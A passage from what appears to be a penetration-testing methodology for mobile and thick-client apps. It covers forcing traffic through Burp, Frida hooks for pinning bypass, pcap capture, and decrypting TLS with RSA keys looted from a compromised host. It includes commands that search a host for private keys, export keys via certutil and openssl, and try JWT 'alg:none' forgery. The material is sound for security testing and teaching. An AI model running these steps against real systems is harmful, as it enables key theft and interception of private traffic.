diff <(sort urls.txt) <(curl -s https://docs.target.example/api | grep -oE 'https?://[^ ]+' | sort -u)
```

### 7.2 Dynamic Capture — Burp + Frida Network Hooks
```bash
# Force ALL traffic through Burp:
#   Mobile: device proxy + system-CA install (Phase 2.5 / 3.5)
#   Desktop: env vars HTTPS_PROXY=http://<ATTACKER_IP>:8080  +  -Djavax.net.ssl.trustStore=...

# Some apps pin or use cert-pinning libs that aren't in objection's bypass list. Hook the raw socket layer with Frida:
frida -U -f com.target.app -l hooks/network.js --no-pause
# hooks/network.js: hook -[NSURLSession dataTaskWithRequest:] (iOS), HttpURLConnection.connect (Android), SSL_write (native).
```

### 7.3 Pcap Capture (when proxy doesn't work)
```bash
# Some clients use gRPC, custom binary protocols, or pin so hard that proxy is impossible.
# Capture on emulator's tap interface or device's USB tether interface.
sudo tcpdump -i <IFACE> -w client.pcap host <BACKEND_IP>

# Wireshark — TLS keylog file lets you decrypt if you control the client process
SSLKEYLOGFILE=/tmp/sslkeys.log <APP_BIN>       # Chromium-based + many Node clients honor this
# Wireshark → Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename = /tmp/sslkeys.log
```

### 7.3b TLS Decryption with Exfiltrated RSA Private Key

When you recover a server's RSA private key (from filesystem loot, misconfigured backup, or memory dump), use it to passively decrypt captured TLS traffic. Only works with RSA key exchange (TLS_RSA_*) — NOT with (EC)DHE cipher suites (forward secrecy defeats this).

```bash
# --- Find RSA private keys on compromised host ---
find / -type f \( -name '*.pem' -o -name '*.key' -o -name '*.p12' -o -name '*.pfx' \) 2>/dev/null
find / -type f -exec grep -l 'BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY' {} \; 2>/dev/null
# Common locations:
#   /etc/ssl/private/        /etc/nginx/ssl/         /etc/apache2/ssl/
#   /opt/*/conf/             /home/*/.ssl/           /etc/letsencrypt/live/

# --- Verify key matches the certificate ---
openssl x509 -noout -modulus -in <CERT_FILE> | md5sum
openssl rsa  -noout -modulus -in <KEY_FILE>  | md5sum
# If md5sums match → key belongs to that cert

# --- Wireshark GUI: decrypt pcap with RSA key ---
# Edit → Preferences → Protocols → TLS → RSA keys list → Edit:
#   IP: <SERVER_IP>   Port: <PORT>   Protocol: http   Key File: <KEY_FILE>
# Apply → traffic decrypts in-place if RSA key exchange was used

# --- tshark CLI: decrypt and extract HTTP from pcap ---
tshark -r <PCAP_FILE> \
  -o "tls.keys_list:<SERVER_IP>,<PORT>,http,<KEY_FILE>" \
  -Y "http" -T fields -e http.host -e http.request.uri -e http.response.code

# Full decrypted stream export
tshark -r <PCAP_FILE> \
  -o "tls.keys_list:<SERVER_IP>,<PORT>,http,<KEY_FILE>" \
  -Y "http" --export-objects "http,exported_objects/"

# --- Check if cipher suite allows RSA key decryption ---
tshark -r <PCAP_FILE> -Y "tls.handshake.type == 2" \
  -T fields -e tls.handshake.ciphersuite
# Cipher suites starting with TLS_RSA_* = decryptable with server key
# TLS_ECDHE_* or TLS_DHE_* = forward secrecy, key alone won't decrypt (need SSLKEYLOGFILE)

# --- Combined approach: SSLKEYLOGFILE for forward-secrecy suites ---
# If you control the client process (thick-client you're testing):
SSLKEYLOGFILE=/tmp/sslkeys.log <APP_BINARY>
# Wireshark → Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename: /tmp/sslkeys.log
# This works for ALL cipher suites including ECDHE

# --- PKCS#12 / PFX key extraction (Windows IIS exports) ---
openssl pkcs12 -in <PFX_FILE> -nocerts -nodes -out extracted_key.pem -passin pass:<PASSWORD>
openssl pkcs12 -in <PFX_FILE> -clcerts -nokeys -out extracted_cert.pem -passin pass:<PASSWORD>
```

#### Living-off-the-land / LOTL variant

```bash
# tcpdump capture + offline analysis (no Wireshark on target)
tcpdump -i <IFACE> -w /tmp/capture.pcap host <TARGET_IP> and port 443

# OpenSSL s_client to confirm cipher suite before investing time
openssl s_client -connect <TARGET_IP>:<PORT> </dev/null 2>/dev/null | grep -E 'Cipher|Protocol'

# If no tshark available, use openssl to test decryption feasibility
openssl rsautl -decrypt -inkey <KEY_FILE> -in <ENCRYPTED_PREMASTER> -out premaster.bin 2>/dev/null && echo "Key works"

# ssldump (lighter than tshark, often pre-installed on network appliances)
ssldump -r <PCAP_FILE> -k <KEY_FILE> -d 2>/dev/null | grep -A5 'HTTP/'
```

```powershell
# Windows LOTL: netsh trace + certutil for key extraction
netsh trace start capture=yes tracefile=C:\tmp\capture.etl
# ... exercise the app ...
netsh trace stop
# Convert ETL → pcap with etl2pcapng (Microsoft tool) then decrypt offline

# Extract private key from Windows cert store (requires admin + key marked exportable)
certutil -exportPFX -p "<EXPORT_PASSWORD>" My "<CERT_THUMBPRINT>" C:\tmp\exported.pfx
```

### 7.4 Auth-Header / Signing-Scheme Recovery
```text
Once you've captured a request, the next-most-valuable thing is understanding HOW it was signed:
  - HMAC over (timestamp + method + path + body)?  Find the secret in the binary (Phases 2.3 / 4.3 / 5.3).
  - JWT with custom claims?  Decode header — `alg:HS256` with key embedded? Try `alg:none` and re-sign.
  - Custom token rotation?  Frida-hook the function that emits the header, log every call.

Document the scheme. Hand the documented scheme + reproduction script to web-methodology.md Phase 6 (API Testing).
```

### 7.5 Pivot to web-methodology.md
```text
Deliverable for the API testing phase:
  endpoints.txt          — full list of URLs the client talks to
  signing.md             — how each request is authenticated/signed (with code refs into decompiled output)
  sample-requests.http   — one captured request per endpoint, ready for `httpie`/`curl`/Burp Repeater
  notes.md               — undocumented parameters, debug flags, version-skew endpoints (v1 still up alongside v2)

→ Open web-methodology.md Phase 6 (API Testing) and iterate per endpoint:
   - IDOR / BOLA across user-scoped object IDs
   - BFLA across role-scoped operations (admin endpoints reachable from regular tokens?)
   - Mass assignment / over-posting
   - Rate limit / abuse
   - SSRF in any URL-accepting parameter
   - Race conditions on state-changing endpoints (web-methodology.md Phase 3.9)
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)
